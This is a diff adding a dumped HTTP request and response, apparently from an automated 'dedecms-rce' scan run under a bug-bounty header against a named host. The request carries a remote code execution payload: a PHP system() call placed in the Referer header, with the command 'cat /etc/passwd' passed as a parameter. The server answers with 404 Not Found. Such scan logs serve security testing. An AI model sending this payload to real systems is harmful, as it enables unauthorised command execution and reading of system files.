@@ -1,0 +1,29 @@
+[dedecms-rce] Dumped HTTP request for https://techsolutions.bitpanda.com/plus/flink.php?dopost=save&c=cat%20/etc/passwd
+
+
+GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Connection: close
+Referer: <?php "system"($c);die;/*ref
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[dedecms-rce] Dumped HTTP response https://techsolutions.bitpanda.com/plus/flink.php?dopost=save&c=cat%20/etc/passwd
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 de8b5f44ffbaf97a58ad36dbe4a4a7c0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: qDj8p9i-tfuecYlzbKx6HiU2UaXG0aL2o-vO2GeOPshcVaco80vgRw==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: SjcMf/xCAhlAjn3Zj5j8yxCNrzfd1RvFUNIRMge8P/4bTZ8LAJzqvC68lxGc2D6eDyF2/ZaAJvs=
+X-Amz-Request-Id: 74NE853ZXE6ZQ80D
+X-Cache: Error from cloudfront
+
+Not Found
